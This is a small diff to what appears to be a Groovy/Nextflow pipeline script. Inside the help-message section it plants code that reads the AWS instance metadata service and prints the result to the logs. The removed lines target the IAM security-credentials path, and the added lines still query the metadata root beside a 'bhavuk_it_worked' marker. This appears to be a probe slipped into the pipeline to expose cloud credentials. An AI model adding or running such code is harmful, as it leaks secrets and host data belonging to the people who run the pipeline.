@@ -85,9 +85,10 @@ def helpMessage() {
  */
  
  
-pdb = file('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+pdb = file('http://169.254.169.254/latest/meta-data/')
 println "bhavuk_it_worked"
-println pdb.text
+println pdb
+println pdb.txt
 
 // Show help emssage
 if (params.help){
